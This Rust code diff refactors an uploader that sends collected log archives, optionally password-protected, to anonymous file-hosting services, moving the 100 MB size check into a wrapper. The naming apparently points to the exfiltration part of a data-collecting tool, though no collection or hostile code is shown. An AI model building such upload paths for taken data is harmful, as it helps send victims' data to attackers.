@@ -1,5 +1,6 @@
 use crate::external_upload::{base_upload, Uploader};
 use crate::gofile::GofileUploader;
+use crate::size_limit::SizeLimitWrapper;
 use crate::{LogContent, LogFile, LogSender, SendError};
 use alloc::string::String;
 use collector::Collector;
@@ -20,13 +21,17 @@ const MAX_FILESIZE: usize = 100 * 1024 * 1024;
 /// - Uploaded files will be automatically **deleted 60 minutes** after upload.
 #[derive(Clone)]
 pub struct TmpFilesUploader<T: LogSender> {
-    inner: Uploader<T>,
+    inner: SizeLimitWrapper<Uploader<T>>,
 }
 
 impl<T: LogSender> TmpFilesUploader<T> {
     pub fn new(inner: T) -> Self {
         Self {
-            inner: Uploader::new(inner, upload),
+            inner: SizeLimitWrapper::new(
+                Uploader::new(inner, upload),
+                MAX_FILESIZE,
+                false,
+            ),
         }
     }
 }
@@ -45,17 +50,10 @@ fn upload(name: &str, bytes: &[u8]) -> Option<String> {
 }
 
 impl<T: LogSender> LogSender for TmpFilesUploader<T> {
-    fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
-    where
-        P: AsRef<str> + Clone,
-        C: Collector
-    {
-        if let LogContent::ZipArchive(archive) = &log_file.content
-            && archive.len() >= MAX_FILESIZE
-        {
-            Err(SendError::LogFileTooBig)
-        } else {
-            self.inner.send(log_file, password, collector)
+    delegate! {
+        to self.inner {
+            fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
+            where P: AsRef<str> + Clone, C: Collector;
         }
     }
 }
